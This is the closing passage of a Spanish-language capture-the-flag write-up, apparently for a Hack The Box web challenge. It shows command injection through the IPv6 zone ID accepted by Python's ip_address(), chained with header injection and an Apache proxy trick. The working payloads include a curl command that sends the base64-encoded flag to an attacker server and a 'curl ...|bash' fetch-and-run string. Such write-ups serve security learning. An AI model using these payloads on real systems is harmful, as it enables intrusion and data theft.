</span></span><span style="display:flex;"><span>&lt;hr&gt;
</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> Server at 127.0.0.1 Port 80&lt;/address&gt;
</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></div><p>La parte final del reto consistía en explotar una vulnerabilidad dentro de <code>attack-ip</code> con el fin de inyectar comandos. Recordemos que el parámetro <code>target</code> es validado con la función <code>ip_address()</code>, la cual genera una excepción si la cadena no tiene un formato de dirección IPv4 o IPv6. A continuación, muestro un par de ejemplos de esta funcionalidad:</p>
<p><strong>Dirección IPv4 válida:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
</span></span><span style="display:flex;"><span>print(ip_address(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>))
</span></span></code></pre></div><p><strong>Resultado:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>127.0.0.1
</span></span></code></pre></div><p><strong>Dirección IPv4 inválida:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
</span></span><span style="display:flex;"><span>print(ip_address(<span style="color:#e6db74">&#39;127.0.TEST.1&#39;</span>))
</span></span></code></pre></div><p><strong>Resultado:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ERROR!
</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;&lt;main.py&gt;&#34;</span>, line 2, in &lt;module&gt;
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.12/ipaddress.py&#34;</span>, line 54, in ip_address
</span></span><span style="display:flex;"><span>    raise ValueError<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#39;{address!r} does not appear to be an IPv4 or IPv6 address&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ValueError: <span style="color:#e6db74">&#39;127.0.TEST.1&#39;</span> does not appear to be an IPv4 or IPv6 address
</span></span></code></pre></div><p>Después de leer la <a href="https://docs.python.org/3/library/ipaddress.html">documentación de la biblioteca ipaddress</a> y el <a href="https://docs.python.org/3/library/ipaddress.html">RFC 4007</a>, aprendí que en IPv6 es posible indicar un identificador de zona, usando la sintaxis <code>&lt;ipv6&gt;%&lt;id_zona&gt;</code>. Lo interesante es la única validación que hace la función <code>ip_address()</code> sobre esta característica: si el caracter &lsquo;%&rsquo; está presente, el ID de zona tambien tiene que incluirse, sin verificar qué tipo de caracteres lo componen.</p>
<p>Teniendo esto en mente, probemos nuevamente la función.</p>
<p><strong>Dirección IPv6 con inyección de comandos en ID de zona</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
</span></span><span style="display:flex;"><span>print(ip_address(<span style="color:#e6db74">&#39;::1%$(whoami)&#39;</span>))
</span></span></code></pre></div><p><strong>Resultado:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>::1%<span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>La idea detrás del <em>payload</em> final es codificar en base64 la bandera y usar <code>curl</code> para crear una petición HTTP, agregando la bandera codificada como parámetro en la URL y enviándola a un servidor bajo nuestro control.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://&lt;--REDACTED--&gt;?flag=`cat%2b/flag*|base64`)%26name=v%0d%0a%0d%0a&#39;</span>
</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:42:19 GMT
</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Location: ../?result<span style="color:#f92672">=</span>Succesfully attacked ::1%<span style="color:#66d9ef">$(</span>curl hackersfight.club:8000|bash<span style="color:#66d9ef">)</span>!
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">331</span>
</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?result=Succesfully attacked ::1%</span><span style="color:#66d9ef">$(</span>curl https://&lt;--REDACTED--&gt;?flag<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /flag*|base64<span style="color:#e6db74">`</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">!&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
</span></span><span style="display:flex;"><span>&lt;hr&gt;
</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> Server at 127.0.0.1 Port 80&lt;/address&gt;
</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></div><p>Finalmente, recibiendo la petición desde el servidor vulnerable y consiguiendo la bandera.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ grep flag access.log
</span></span><span style="display:flex;"><span>83.136.249.227 - - <span style="color:#f92672">[</span>26/Mar/2025:03:42:19 +0000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /?flag=SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0= HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4252</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#e6db74">&#34;curl/7.74.0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0=&#39;</span>|base64 -d
</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>h4ndl1n6_m4l4k4r5_f0rc35<span style="color:#f92672">}</span>
</span></span></code></pre></div><h2 id="referencias-útiles">Referencias útiles<a href="#referencias-útiles" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">Orange Tsai | Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></li>
<li><a href="https://docs.python.org/3/library/ipaddress.html">Python docs | ipaddress — IPv4/IPv6 manipulation library</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc4007.html">RFC 4007 | IPv6 Scoped Address Architecture</a></li>
<li><a href="https://portswigger.net/web-security/ssrf">PortSwigger | Server-Side Request Forgery</a></li>
<li><a href="https://portswigger.net/web-security/os-command-injection">PortSwigger | OS Command Injection</a></li>
</ul>

      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Más posts</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="https://albertnath.github.io/hfc-blog/posts/shell_shop/" class="button inline prev">
        &lt; [<span class="button__text">shell_shop</span>]
      </a>
    
    
    
  </div>
</div>


  

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="https://albertnath.github.io/hfc-blog/bundle.min.js"></script>





  
</div>

</body>
</html>
